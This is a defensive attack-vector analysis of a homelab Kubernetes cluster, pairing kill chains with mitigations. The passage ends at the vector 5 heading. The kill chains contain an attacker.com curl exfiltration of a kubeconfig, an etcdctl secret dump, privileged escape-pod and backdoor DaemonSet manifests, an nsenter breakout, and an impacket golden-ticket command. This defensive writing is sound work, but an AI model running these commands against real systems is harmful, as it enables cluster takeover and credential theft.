# Top 5 Attack Vectors — Homelab Kubernetes Security Cluster

**Document ID:** AV-K8S-001  
**Version:** 1.0  
**Classification:** Internal / Lab Use  
**Author:** Jason A. Slocomb  
**Date:** 2026-03-02  
**Related Documents:**
- [`docs/threat-model.md`](threat-model.md) — Full STRIDE analysis (source of all threat IDs)
- [`docs/cmmc-mapping.md`](cmmc-mapping.md) — NIST 800-171 / CMMC Level 2 control mapping

---

## Purpose

This document describes the five highest-priority attack vectors against the homelab Kubernetes cluster, ranked by a combination of impact (blast radius of successful exploitation) and likelihood (attacker accessibility given the cluster's exposure). For each vector, it details the full kill chain, the specific threat IDs from the STRIDE analysis, the mitigating controls with implementation evidence, and the NIST 800-171 requirements each control satisfies.

This is a companion to `threat-model.md`, written at a different level of abstraction: where the threat model enumerates individual component-level threats, this document describes *attack vectors* — end-to-end paths that chain multiple threats into a coherent exploit scenario. Defenders think in terms of attack vectors; this framing makes the controls easier to communicate to hiring managers and auditors.

---

## Ranking Methodology

Each vector is scored on two axes:

| Axis | Definition |
|---|---|
| **Impact** | Blast radius of successful exploitation — what the attacker gains, how widely it propagates |
| **Likelihood** | Probability of exploitation given no mitigations — attacker skill required, prerequisite access needed, public tooling availability |

Both axes are rated LOW / MEDIUM / HIGH / CRITICAL. Combined score determines ranking.

---

## Vector Summary

| Rank | Vector | Impact | Likelihood | Key Threat IDs |
|---|---|---|---|---|
| 1 | [etcd Direct Access](#1-etcd-direct-access) | CRITICAL | MEDIUM | T-2.1, I-2.1, S-2.1 |
| 2 | [Compromised CI/CD Pipeline](#2-compromised-cicd-pipeline) | CRITICAL | HIGH | S-5.1, T-5.1, T-5.2 |
| 3 | [Privileged Pod Container Escape](#3-privileged-pod-container-escape) | CRITICAL | HIGH | E-1.1, E-3.1, E-3.2 |
| 4 | [FreeIPA / Identity Provider Compromise](#4-freeipa--identity-provider-compromise) | CRITICAL | MEDIUM | S-4.1, S-4.2, T-4.1 |
| 5 | [Secret Credential Harvesting](#5-secret-credential-harvesting) | HIGH | HIGH | I-1.1, I-2.1, I-11.1 |

---

## 1. etcd Direct Access

**Impact: CRITICAL | Likelihood: MEDIUM | Overall: CRITICAL**

### Why This Vector Is Ranked #1

etcd is the cluster's only authoritative state store. Every Kubernetes object — Deployments, Secrets, RBAC policies, service account tokens, admission webhooks — exists as a serialized record in etcd. All Kubernetes security controls (RBAC, PodSecurity admission, NetworkPolicy) are implemented *above* etcd, in the API server layer. An attacker with direct etcd access bypasses every one of those controls simultaneously. There is no second line of defense if etcd is reached.

The likelihood is MEDIUM rather than HIGH because reaching etcd requires first compromising the control-plane node — a prerequisite that demands either physical access to the Proxmox host, a container escape from a pod running on the control-plane node, or theft of the etcd client certificates from the node filesystem. These prerequisites exist, but they are not trivially achievable from the cluster perimeter.

### Kill Chain

```
Step 1: Initial Access
  Attacker compromises the control-plane node (k8s-cp01)
  Entry paths: SSH key theft, Proxmox console access, CVE in a
  privileged pod scheduled on the control-plane taint

Step 2: Credential Extraction
  Attacker reads etcd client certificates from the node filesystem:
    /etc/kubernetes/ssl/etcd/server-client.crt
    /etc/kubernetes/ssl/etcd/server-client.key
    /etc/kubernetes/ssl/etcd/server-ca.crt

Step 3: Direct etcd Access (bypasses ALL Kubernetes RBAC)
  ETCDCTL_API=3 etcdctl \
    --endpoints=https://127.0.0.1:2379 \
    --cert=/etc/kubernetes/ssl/etcd/server-client.crt \
    --key=/etc/kubernetes/ssl/etcd/server-client.key \
    --cacert=/etc/kubernetes/ssl/etcd/server-ca.crt \
    get /registry/secrets/ --prefix

Step 4: Secret Extraction (without a single kube-apiserver audit event)
  All Secrets base64-decoded from etcd output.
  Without encryption at rest, values are immediately readable.

Step 5: Lateral Movement
  Extracted credentials used to: access AWS, access GitLab,
  SSH to all AWX-managed nodes, authenticate to FreeIPA,
  authenticate to any service using a stolen token.

Step 6: Persistence
  Attacker writes a new cluster-admin ClusterRoleBinding directly
  to etcd. Next kube-apiserver restart picks it up as legitimate
  state. No audit event. No admission webhook fires.
```

### Threat IDs

| ID | Description |
|---|---|
| [T-2.1](threat-model.md#t----tampering-1) | Direct etcd write bypassing all RBAC |
| [I-2.1](threat-model.md#i----information-disclosure-1) | Secrets stored at rest without encryption |
| [S-2.1](threat-model.md#s----spoofing-1) | etcd client certificate forgery |
| [T-2.2](threat-model.md#t----tampering-1) | etcd backup snapshot exfiltration |
| [R-1.2](threat-model.md#r----repudiation) | No API server audit events generated for direct etcd operations |

### Mitigating Controls

**M1.1 — Encrypt Secrets at Rest**

Configure `--encryption-provider-config` on the kube-apiserver using the `secretbox` encryption provider. Even if an attacker reads etcd data directly, Secret objects appear as opaque ciphertext — not base64-encoded plaintext.

```yaml
# /etc/kubernetes/encryption.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - secretbox:
        keys:
        - name: key1
          secret: <32-byte-base64-encoded-key>
    - identity: {}
```

Verify by reading a secret directly from etcd: `etcdctl get /registry/secrets/default/my-secret` should return ciphertext beginning with `k8s:enc:secretbox:v1:`.

*Addresses:* [I-2.1](threat-model.md#i----information-disclosure-1) | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**M1.2 — Restrict etcd Network Exposure to Loopback Only**

Configure etcd to listen only on the loopback interface and the control-plane node's internal IP. Workload pods and external hosts cannot reach the etcd port (2379) even if they have valid client certificates.

```bash
# /etc/rancher/rke2/config.yaml (RKE2 etcd config)
# etcd-expose-metrics: false
# Verified via: ss -tlnp | grep 2379
# Expected: only 127.0.0.1:2379 and <cp-ip>:2379, never 0.0.0.0:2379
```

Combined with a NetworkPolicy blocking pods from reaching port 2379 on any host IP.

*Addresses:* [S-2.1](threat-model.md#s----spoofing-1), [T-2.1](threat-model.md#t----tampering-1) | *NIST:* [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**M1.3 — Encrypt etcd Backup Snapshots**

etcd snapshots contain the complete cluster state including all Secrets. Encrypt snapshots with GPG before writing to backup storage so that a stolen snapshot file is unreadable without the decryption key.

```bash
etcdctl snapshot save /tmp/snapshot.db
gpg --recipient backup-key@lab.internal \
    --encrypt /tmp/snapshot.db \
    --output /backup/etcd/snapshot-$(date +%Y%m%d).db.gpg
rm /tmp/snapshot.db
```

Decryption key stored in Vault; access policy audited separately.

*Addresses:* [T-2.2](threat-model.md#t----tampering-1), [I-2.1](threat-model.md#i----information-disclosure-1) | *NIST:* [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**M1.4 — Store etcd CA Private Key Offline**

The etcd CA private key is only needed when issuing new node certificates. After initial cluster provisioning, move the key off the control-plane node's filesystem and into encrypted offline storage. Without the CA key on disk, an attacker who compromises k8s-cp01 cannot forge new etcd client certificates.

*Addresses:* [S-2.1](threat-model.md#s----spoofing-1) | *NIST:* [SC-3.13.10](cmmc-mapping.md#sc-31310--establish-and-manage-cryptographic-keys), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**M1.5 — Monitor for etcdctl Usage on Control-Plane Node**

AIDE monitors the node filesystem. Splunk ingests AIDE reports and system logs. Alert on: `etcdctl` binary execution via auditd `execve` syscall monitoring; direct TCP connections to port 2379 from unexpected sources; any access to `/etc/kubernetes/ssl/etcd/` files outside of kubeadm/RKE2 process context.

```
Splunk: index=linux_auditd sourcetype=auditd
  comm="etcdctl" | stats count by host, uid, ppid
  | where uid != 0 OR ppid NOT IN (known_rke2_pids)
```

*Addresses:* [T-2.1](threat-model.md#t----tampering-1) | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

### Residual Risk After Controls

With all five controls implemented, successful direct etcd exploitation requires: (1) physical or hypervisor-level control-plane access AND (2) the GPG key for backup decryption AND (3) accepting that extracted Secrets are encrypted ciphertext, not plaintext. This residual risk is documented as `RR-01` (single-node control plane SPOF) in `threat-model.md`.

---

## 2. Compromised CI/CD Pipeline

**Impact: CRITICAL | Likelihood: HIGH | Overall: CRITICAL**

### Why This Vector Is Ranked #2

The CI/CD pipeline is ranked #2 because of its *likelihood*. Unlike the etcd vector which requires a prerequisite node compromise, a pipeline attack requires only:

- A compromised developer account with GitLab access (phishing, credential stuffing, password reuse), OR
- A malicious merge request on an unprotected branch, OR
- A single vulnerable dependency in a pipeline `pip install` / `npm install` step

The pipeline's blast radius is CRITICAL because it holds the cluster deployment credentials and runs with elevated ServiceAccount permissions. An attacker who controls the pipeline can deploy arbitrary Kubernetes manifests — privileged pods, new ClusterRoleBindings, modified admission webhooks — that look identical to legitimate deployment operations in every audit log.

This vector is particularly relevant to the lab environment, where a single developer (the homelab owner) both commits code and approves deployments, making the code-review approval gate the only separation of duty that exists.

### Kill Chain

```
Step 1: Initial Access (choose one)
  Path A — Developer credential theft:
    Attacker phishes GitLab password → bypasses MFA via session
    cookie theft → has full developer-level repository access

  Path B — Dependency confusion:
    Attacker publishes malicious package to PyPI with same name
    as a private internal package → pipeline runs
    `pip install <internal-pkg>` → resolves attacker's version
    → malicious code runs in build context

  Path C — Unprotected branch pipeline:
    Attacker opens MR from a fork → pipeline runs on MR →
    .gitlab-ci.yml in the MR runs with production CI variables

Step 2: CI Variable Exfiltration
  Malicious pipeline step executes:
    echo $KUBE_CONFIG | base64 -d | curl -d @- https://attacker.com/
  Exports: kubeconfig, registry credentials, Vault tokens,
  Ansible Vault password — all stored as GitLab CI variables

Step 3: Cluster Access from Attacker Infrastructure
  Attacker uses exfiltrated kubeconfig to directly access cluster
  API from outside the lab network. All actions appear in audit
  log as legitimate CI service account (system:serviceaccount:
  gitlab:ci-deploy) — indistinguishable from real deployments.

Step 4: Malicious Workload Deployment
  kubectl apply -f - <<EOF
  apiVersion: apps/v1
  kind: DaemonSet
  metadata:
    name: node-backdoor
    namespace: kube-system
  spec:
    template:
      spec:
        hostPID: true
        hostNetwork: true
        containers:
        - name: shell
          image: alpine
          securityContext:
            privileged: true
          volumeMounts:
          - name: host
            mountPath: /host
        volumes:
        - name: host
          hostPath:
            path: /
  EOF

Step 5: Persistence + Lateral Movement
  DaemonSet gives root shell on every node. From nodes:
  read kubelet client certs → full API server access as
  system:nodes. Read all pod secrets. SSH using node
  credentials to all Ansible-managed hosts.
```

### Threat IDs

| ID | Description |
|---|---|
| [S-5.1](threat-model.md#s----spoofing-4) | CI/CD variable exfiltration via pipeline injection |
| [T-5.1](threat-model.md#t----tampering-4) | Pipeline deploys malicious workloads to cluster |
| [T-5.2](threat-model.md#t----tampering-4) | Dependency confusion / supply chain poisoning |
| [R-5.1](threat-model.md#r----repudiation-1) | Shared CI service account prevents attribution |
| [T-1.1](threat-model.md#t----tampering) | Malicious admission webhook (deployed via pipeline) |

### Mitigating Controls

**M2.1 — Protect the Main Branch; Require Merge Request Review**

Configure GitLab branch protection so that direct pushes to `main` are blocked for all users including maintainers. All changes must arrive via merge request with at least one required approver. This forces every `.gitlab-ci.yml` change through a human review gate.

```
GitLab Settings → Repository → Protected Branches:
  Branch: main
  Allowed to merge: Developers + Maintainers
  Allowed to push: No one
  Required approvals: 1
  Code owners approval: enabled (for changes to .gitlab-ci.yml)
```

*Addresses:* [T-5.1](threat-model.md#t----tampering-4), [T-5.2](threat-model.md#t----tampering-4) | *NIST:* [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes), [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes)

---

**M2.2 — Scope CI ServiceAccounts to Minimum Required Permissions**

Replace any shared `ci-deploy` cluster-admin token with per-namespace, per-application ServiceAccounts. A pipeline that deploys to the `monitoring` namespace should have a `Role` binding in that namespace only — it cannot deploy a DaemonSet to `kube-system` or create ClusterRoleBindings.

```yaml
# k8s/rbac/gitlab-ci-monitoring-role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ci-deploy
  namespace: monitoring
rules:
- apiGroups: ["apps"]
  resources: ["deployments", "daemonsets", "statefulsets"]
  verbs: ["get", "list", "create", "update", "patch"]
- apiGroups: [""]
  resources: ["configmaps", "services"]
  verbs: ["get", "list", "create", "update", "patch"]
# Explicitly NO: secrets list/get, clusterroles, webhooks
```

*Addresses:* [S-5.1](threat-model.md#s----spoofing-4), [T-5.1](threat-model.md#t----tampering-4), [R-5.1](threat-model.md#r----repudiation-1) | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [AC-3.1.2](cmmc-mapping.md#ac-312--limit-system-access-to-authorized-transaction-types)

---

**M2.3 — Pin All Dependency Versions to Immutable Digests**

Eliminate the dependency confusion attack surface by pinning every external dependency to a cryptographic digest rather than a mutable version tag.

```yaml
# .gitlab-ci.yml — pin to digest, not tag
image: python@sha256:a1b2c3d4e5f6...

# requirements.txt — pin exact versions + hashes
requests==2.31.0 \
    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
```

For Helm charts: `helm pull chart --version x.y.z` then verify the chart's SHA-256 before applying.

*Addresses:* [T-5.2](threat-model.md#t----tampering-4), [T-8.1](threat-model.md#t----tampering-7) | *NIST:* [SA-3.12.1](cmmc-mapping.md#sa-3121--monitor-and-protect-against-supply-chain-risk), [CM-3.4.1](cmmc-mapping.md#cm-341--establish-baseline-configurations)

---

**M2.4 — Scan Images in Pipeline; Block on Critical CVEs**

Add a Trivy scan stage before any deployment step. Pipeline fails and deployment is blocked if any image contains a CRITICAL severity CVE with no exception.

```yaml
# .gitlab-ci.yml
scan-image:
  stage: test
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity CRITICAL $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  allow_failure: false   # failure blocks the pipeline
```

*Addresses:* [T-5.2](threat-model.md#t----tampering-4), [T-8.2](threat-model.md#t----tampering-7) | *NIST:* [SA-3.12.1](cmmc-mapping.md#sa-3121--monitor-and-protect-against-supply-chain-risk), [SI-3.14.1](cmmc-mapping.md#si-3141--identify-and-manage-information-system-flaws)

---

**M2.5 — Replace Static Kubeconfig with Short-Lived OIDC Tokens**

Replace the long-lived kubeconfig stored as a CI variable with GitLab's native OIDC integration. Each pipeline job receives a JWT valid for that job's duration only (typically minutes). A leaked OIDC token is useless to an attacker 15 minutes later.

```yaml
# .gitlab-ci.yml
deploy:
  id_tokens:
    KUBE_TOKEN:
      aud: https://kube-apiserver.lab.internal
  script:
    - kubectl --token=$KUBE_TOKEN apply -f manifests/
```

*Addresses:* [S-5.1](threat-model.md#s----spoofing-4), [R-5.1](threat-model.md#r----repudiation-1) | *NIST:* [IA-3.5.2](cmmc-mapping.md#ia-352--authenticate-devices), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

### Residual Risk After Controls

Branch protection + scoped ServiceAccounts eliminate the highest-severity paths. The remaining residual risk is a developer account compromise with valid MFA bypass — a sophisticated attack requiring targeted effort. This residual risk is accepted given the lab context.

---

## 3. Privileged Pod Container Escape

**Impact: CRITICAL | Likelihood: HIGH | Overall: CRITICAL**

### Why This Vector Is Ranked #3

Container escape via a privileged pod is ranked #3 because of its combination of ease and impact. Creating a `privileged: true` pod requires only standard cluster `create pods` permission — no special exploit needed. Once running, escaping the container boundary is a single `nsenter` command. The result is root on the node OS, which from a Kubernetes security perspective is equivalent to full cluster compromise of that node and everything scheduled on it.

The likelihood is HIGH because over-privileged namespaces (lacking PodSecurity enforcement) are extremely common — one of the most frequent findings in real Kubernetes security assessments. RKE2 ships with CIS hardening enabled, but namespace-level PodSecurity labels must be explicitly applied to each namespace and are frequently omitted during rapid lab setup.

### Kill Chain

```
Step 1: Identify a Permissive Namespace
  Attacker with limited cluster access enumerates namespace labels:
    kubectl get namespace --show-labels | grep -v "pod-security"
  Any namespace missing pod-security.kubernetes.io/enforce: restricted
  is a viable launch point.

Step 2: Deploy a Privileged Escape Pod
  kubectl apply -n <permissive-namespace> -f - <<EOF
  apiVersion: v1
  kind: Pod
  metadata:
    name: escape
  spec:
    hostPID: true
    hostNetwork: true
    containers:
    - name: escape
      image: ubuntu
      securityContext:
        privileged: true
      volumeMounts:
      - name: host-root
        mountPath: /host
    volumes:
    - name: host-root
      hostPath:
        path: /
  EOF

Step 3: Break Out of Container Namespace
  kubectl exec -it escape -- nsenter \
    --target 1 --mount --uts --ipc --net -- /bin/bash
  # Result: root shell with full host OS visibility

Step 4: Extract All Credentials from the Node
  # Kubelet client certificate (API server access as system:node:*)
  cat /etc/kubernetes/ssl/kube-node.key
  # All pod secrets mounted as volumes on this node
  find /var/lib/kubelet/pods -name "*.json" -path "*/secrets/*"
  # Container runtime socket (create containers outside K8s)
  ls /run/containerd/containerd.sock

Step 5: Authenticate to API Server as Node Identity
  kubectl --client-certificate=kube-node.crt \
          --client-key=kube-node.key \
          --server=https://apiserver:6443 \
          get secrets --all-namespaces
  # Node identity can read all secrets for pods on this node
  # No RBAC violation — this is authorized access for a node

Step 6: Repeat for Each Node
  Schedule the escape pod on each node via nodeSelector
  → Extract credentials from each node
  → Full cluster compromise via node identity aggregation
```

### Threat IDs

| ID | Description |
|---|---|
| [E-1.1](threat-model.md#e----elevation-of-privilege) | Privileged pod container escape |
| [E-3.1](threat-model.md#e----elevation-of-privilege-2) | Container escape via privileged pod to node OS |
| [E-3.2](threat-model.md#e----elevation-of-privilege-2) | Kubelet client certificate credential abuse post-escape |
| [I-1.1](threat-model.md#i----information-disclosure) | Secret extraction via node-level access |
| [T-1.2](threat-model.md#t----tampering) | RBAC escalation possible once node access achieved |

### Mitigating Controls

**M3.1 — Enforce PodSecurity `restricted` Profile on All Namespaces**

Label every namespace with the `restricted` PodSecurity profile. This prevents creation of `privileged: true` pods, `hostPID/hostNetwork/hostIPC: true` pods, and pods running as root — blocking the escape pod at admission time.

```bash
# Apply to all non-system namespaces
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}' \
  | tr ' ' '\n' | grep -v "kube-\|rke2-"); do
  kubectl label namespace $ns \
    pod-security.kubernetes.io/enforce=restricted \
    pod-security.kubernetes.io/warn=restricted \
    pod-security.kubernetes.io/audit=restricted \
    --overwrite
done

# Verify: attempt to create privileged pod → should fail
kubectl run test --image=ubuntu \
  --overrides='{"spec":{"containers":[{"name":"test","image":"ubuntu","securityContext":{"privileged":true}}]}}'
# Expected: Error from server (Forbidden): pods "test" is forbidden
```

*Addresses:* [E-1.1](threat-model.md#e----elevation-of-privilege), [E-3.1](threat-model.md#e----elevation-of-privilege-2) | *NIST:* [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes), [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users)

---

**M3.2 — Drop All Linux Capabilities; Use Read-Only Root Filesystem**

Even within the `restricted` profile, explicitly drop all Linux capabilities and mount the container filesystem read-only. An attacker who somehow bypasses PodSecurity admission faces a container with no elevated capabilities and no writable filesystem to drop tooling.

```yaml
# Standard hardened container SecurityContext
securityContext:
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  runAsNonRoot: true
  runAsUser: 1000
  capabilities:
    drop:
    - ALL
```

*Addresses:* [E-1.1](threat-model.md#e----elevation-of-privilege), [E-3.1](threat-model.md#e----elevation-of-privilege-2) | *NIST:* [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes)

---

**M3.3 — Implement OPA/Gatekeeper to Enforce and Alert**

PSA enforcement blocks privileged pods at admission. OPA/Gatekeeper adds a second enforcement layer and generates audit events for attempted violations — so even a failed escape attempt is visible in Splunk.

```yaml
# Gatekeeper ConstraintTemplate: deny-privileged-containers
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: denyprivilegedcontainers
spec:
  crd:
    spec:
      names:
        kind: DenyPrivilegedContainers
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package denyprivilegedcontainers
      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        container.securityContext.privileged == true
        msg := sprintf("Privileged containers not allowed: %v", [container.name])
      }
```

*Addresses:* [E-1.1](threat-model.md#e----elevation-of-privilege), [T-1.1](threat-model.md#t----tampering) | *NIST:* [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use), [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records)

---

**M3.4 — Restrict Pod Create Permissions to Necessary Principals Only**

An attacker can only deploy an escape pod if they have `create` on `pods` (or `create` on a workload resource like `Deployment`). Audit every Role and ClusterRole that grants `create pods` or `* pods` — particularly in non-system namespaces — and remove grants that aren't operationally required.

```bash
# Find all principals with pod-create permission
kubectl get clusterrolebindings,rolebindings -A -o json \
  | jq '.items[] | select(.roleRef.name as $role |
    .subjects[]? | {"subject": ., "namespace": .metadata.namespace})' \
  | grep -A2 "pod"
```

*Addresses:* [E-1.1](threat-model.md#e----elevation-of-privilege), [I-1.1](threat-model.md#i----information-disclosure) | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes)

---

**M3.5 — Detect Escape Attempts via Audit Log Analysis**

`k8s_secret_auditor.py` includes an `EXEC_AFTER_SECRET` rule that flags pod exec followed by secret access — a pattern consistent with post-escape credential extraction. Supplement this with a Splunk alert for privileged pod creation attempts (blocked or succeeded):

```
index=k8s_audit verb=create resource=pods
  | spath output=privileged path=requestObject.spec.containers{}.securityContext.privileged
  | where privileged="true"
  | table _time, user.username, objectRef.namespace, requestObject.metadata.name, annotations.authorization/decision
```

*Addresses:* [E-1.1](threat-model.md#e----elevation-of-privilege), [E-3.1](threat-model.md#e----elevation-of-privilege-2) | *NIST:* [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks), [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records)

---

### Residual Risk After Controls

PSA restricted + OPA + RBAC restriction makes this vector effectively blocked at the cluster layer. The residual path requires compromising a principal with both `create pods` permission in a namespace AND somehow bypassing two independent admission controllers — unlikely. The remaining risk is a zero-day in the admission webhook chain itself (documented in `threat-model.md` as D-1.2).

---

## 4. FreeIPA / Identity Provider Compromise

**Impact: CRITICAL | Likelihood: MEDIUM | Overall: CRITICAL**

### Why This Vector Is Ranked #4

FreeIPA's compromise is ranked #4 because of its *propagation radius*. Unlike a node compromise or a namespace escape, a compromised identity provider doesn't affect a single service — it affects every service that trusts it simultaneously. The cluster, GitLab, AWX, Grafana, Splunk, and Zabbix all use FreeIPA for OIDC authentication. An attacker who controls FreeIPA controls all of these from a single point without touching any of them directly.

The likelihood is MEDIUM because `ipa01` is not directly exposed to the internet, and its attack surface is limited to SSH and the IPA web UI on the lab network. Reaching it requires either: (1) compromising a lab-adjacent host first, or (2) being an insider with direct lab access.

### Kill Chain

```
Step 1: Initial Access to ipa01
  Path A — SSH key theft: attacker has root SSH key to ipa01
    (e.g., via AWX credential store exfiltration — vector overlap
    with Attack Vector 5)
  Path B — IPA admin password: phishing or credential reuse
    → ipa01 admin web UI → full directory access
  Path C — LDAP injection: vulnerable application uses LDAP bind
    with unsanitized user input → authentication bypass

Step 2: Enumerate the Directory
  ipa user-find --all        # all users + group memberships
  ipa group-find --all       # all groups including cluster-admin groups
  ipa hbacrule-find --all    # HBAC rules governing service access

Step 3: Establish Persistence (choose one)
  Option A — Add attacker account to admin group:
    ipa group-add-member admins --users=attacker-account
    → On next OIDC token request for attacker account:
      group claim includes "admins"
      kube-apiserver RBAC grants cluster-admin
      All services with admin LDAP group mapping give admin access

  Option B — Create a shadow admin:
    ipa user-add shadow-svc --first=Service --last=Account
    ipa group-add-member cluster-operators --users=shadow-svc
    → Shadow account invisible in normal user listings
    → Used for persistent access independent of primary compromise

  Option C — Kerberos golden ticket (if krbtgt key compromised):
    python3 impacket/ticketer.py -nthash <krbtgt_hash> \
      -domain-sid <domain_sid> -domain lab.internal -groups 512 \
      shadow-admin
    → TGT valid for 10 years, cannot be invalidated by password changes

Step 4: Authenticate to All Integrated Services
  Using generated OIDC token or Kerberos ticket:
  → kube-apiserver: cluster-admin via group binding
  → GitLab: admin via LDAP group sync
  → AWX: system admin via LDAP admin group
  → Grafana: admin via OIDC group claim
  → Splunk: admin via LDAP authentication

Step 5: Blind the SOC
  Delete Splunk indexes, disable alert rules
  Purge kube-apiserver audit log forward pipeline
  → Subsequent attacker activity is invisible

Step 6: Full Infrastructure Access
  AWX admin → run arbitrary playbooks on all managed nodes
  kubectl cluster-admin → deploy persistent backdoors
  GitLab root → modify source code, inject malicious pipelines
```

### Threat IDs

| ID | Description |
|---|---|
| [S-4.1](threat-model.md#s----spoofing-3) | FreeIPA admin credential compromise |
| [S-4.2](threat-model.md#s----spoofing-3) | Kerberos golden ticket attack |
| [T-4.1](threat-model.md#t----tampering-3) | LDAP group membership manipulation |
| [I-4.1](threat-model.md#i----information-disclosure-3) | LDAP anonymous bind exposing directory structure |
| [D-4.1](threat-model.md#d----denial-of-service-3) | FreeIPA outage cascades to all authentication |

### Mitigating Controls

**M4.1 — Enforce MFA on All FreeIPA Admin Accounts**

Require TOTP (Time-based One-Time Password) for every member of the `admins` group. Password alone is insufficient to authenticate as an admin — an attacker who phishes the admin password still cannot generate a valid OTP without the physical TOTP seed.

```bash
# FreeIPA: enforce OTP for admins group
ipa pwpolicy-mod admins --otp-enabled=TRUE

# Users must enroll a TOTP token:
ipa otptoken-add --type=totp --owner=admin
# User scans QR code in authenticator app
# TOTP seed never touches the network

# Verify: attempt admin login without OTP → should fail
```

*Addresses:* [S-4.1](threat-model.md#s----spoofing-3) | *NIST:* [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

**M4.2 — Disable LDAP Anonymous Bind**

Block anonymous access to the FreeIPA LDAP directory. Without anonymous bind, an attacker who reaches `ipa01`'s LDAP port cannot enumerate users, groups, or service principals without valid credentials. This removes the reconnaissance step that enables targeted attacks.

```bash
# Disable anonymous bind
ldapmodify -x -D "cn=Directory Manager" -W <<EOF
dn: cn=config
changetype: modify
replace: nsslapd-allow-anonymous-access
nsslapd-allow-anonymous-access: rootdse
EOF

# Verify: unauthenticated ldapsearch returns empty result
ldapsearch -x -H ldap://ipa01.lab.internal \
  -b "dc=lab,dc=internal" "(uid=*)" cn uid
# Expected: no entries returned
```

*Addresses:* [I-4.1](threat-model.md#i----information-disclosure-3) | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [AC-3.1.3](cmmc-mapping.md#ac-313--control-flow-of-cui)

---

**M4.3 — Run the FreeIPA Account Auditor Daily**

`freeipa_account_auditor.py` detects: admin accounts that have never logged in, stale privileged accounts (inactive for 90+ days), accounts with expired passwords still in admin groups, and accounts with high failed login counts. Daily execution catches unauthorized account additions within 24 hours.

```bash
# Cron: 02:30 daily
IPA_PASSWORD=$(vault kv get -field=password secret/ipa/admin) \
  python3 /usr/local/bin/freeipa_account_auditor.py \
    --server ipa01.lab.internal \
    --binduser admin \
    --output-json /var/log/ipa_audit.json \
    --output-html /var/www/html/ipa_audit.html

# Splunk alert on any CRITICAL finding:
# index=ipa_audit severity=critical | alert
```

*Addresses:* [S-4.1](threat-model.md#s----spoofing-3), [T-4.1](threat-model.md#t----tampering-3) | *NIST:* [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

**M4.4 — Monitor FreeIPA Authentication Events in Splunk**

Ship FreeIPA's 389-DS access log and krb5kdc log to Splunk. Alert on: admin password resets outside business hours, new LDAP group membership additions, OTP enrollment events (new TOTP token added = possible attacker persistence), and authentication from unexpected source IPs.

```
# Splunk: FreeIPA suspicious group change
index=freeipa sourcetype=ipa_access
  "added value" AND ("admins" OR "cluster-operators")
| table _time, host, actor, target_group, source_ip
| alert if count > 0
```

*Addresses:* [S-4.1](threat-model.md#s----spoofing-3), [T-4.1](threat-model.md#t----tampering-3) | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks)

---

**M4.5 — Store FreeIPA Admin Credentials in Vault with Break-Glass Policy**

The FreeIPA admin password should never be stored in plaintext anywhere — not in AWX, not in CI variables, not in any shell history. Store it in Vault with an access policy that requires explicit approval for retrieval and generates an audit event on every access.

```
vault kv put secret/ipa/admin password=<admin-password>
vault policy write ipa-admin-policy - <<EOF
path "secret/data/ipa/admin" {
  capabilities = ["read"]
  # Require MFA token for access
  mfa_methods = ["totp"]
}
EOF
```

*Addresses:* [S-4.1](threat-model.md#s----spoofing-3), [S-4.2](threat-model.md#s----spoofing-3) | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.7](cmmc-mapping.md#ia-357--enforce-password-complexity)

---

### Residual Risk After Controls

With MFA enforced, anonymous bind disabled, and daily account auditing, the primary residual risk is a compromised TOTP seed (physical access to admin's authenticator device) or a Kerberos golden ticket attack. The golden ticket path requires reading the `krbtgt` password hash from the IPA Kerberos database — only achievable after full ipa01 OS compromise, which itself requires the initial access steps in this vector to already have succeeded. This nested risk is documented as `RR-02` in `threat-model.md`.

---

## 5. Secret Credential Harvesting

